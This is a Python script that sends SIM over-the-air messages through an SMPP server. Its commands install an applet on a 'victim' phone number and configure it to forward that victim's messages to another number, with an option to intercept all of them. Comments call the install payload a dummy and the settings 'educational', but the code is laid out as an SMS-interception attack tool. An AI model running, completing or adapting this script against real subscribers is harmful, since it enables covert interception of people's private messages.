#!/usr/bin/env python3
import argparse, binascii, smpplib.client, smpplib.consts

HOST, PORT = "127.0.0.1", 2775          # SMPP demo server
TON, NPI   = 1, 1                       # International / ISDN

def send_ota(dest, ota_hex):
    cli = smpplib.client.Client(HOST, PORT, 30); cli.connect()
    cli.bind_transceiver(system_id='ota-test', password='123')
    cli.send_message(source_addr_ton=TON, source_addr_npi=NPI, source_addr='12345',
                     dest_addr_ton=TON,   dest_addr_npi=NPI,   destination_addr=dest,
                     short_message=binascii.unhexlify(ota_hex), data_coding=0)
    cli.unbind(); cli.disconnect()

def cmd_install(msisdn):
    # dummy “install” – real payload omitted
    ota = "027100081030121000"          # SMS-PP Download + DISPLAY TEXT
    send_ota(msisdn, ota)
    print(f"✅ Applet INSTALL sent to {msisdn}")

def cmd_configure(msisdn, fwd_to, intercept_all):
    # educational “configure” TLVs
    cfg = f"80{len(fwd_to):02X}{fwd_to.encode().hex()}"      # tag 0x80 = fwd-to
    cfg+= f"81{1:02X}{'01' if intercept_all else '00'}"      # tag 0x81 = flag
    ota = "027100" + f"{len(cfg)//2:02X}" + cfg
    send_ota(msisdn, ota)
    print(f"✅ Applet CONFIG sent to {msisdn} -> forward {fwd_to}")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    sub = p.add_subparsers(dest="cmd", required=True)
    sub.add_parser("install").add_argument("victim")
    cfg = sub.add_parser("configure")
    cfg.add_argument("victim"); cfg.add_argument("--forward-to", required=True)
    cfg.add_argument("--intercept-all", default="false")
    args = p.parse_args()

    if args.cmd=="install":   cmd_install(args.victim)
    else:                     cmd_configure(args.victim, args.forward_to,
                                            args.intercept_all.lower()=="true")
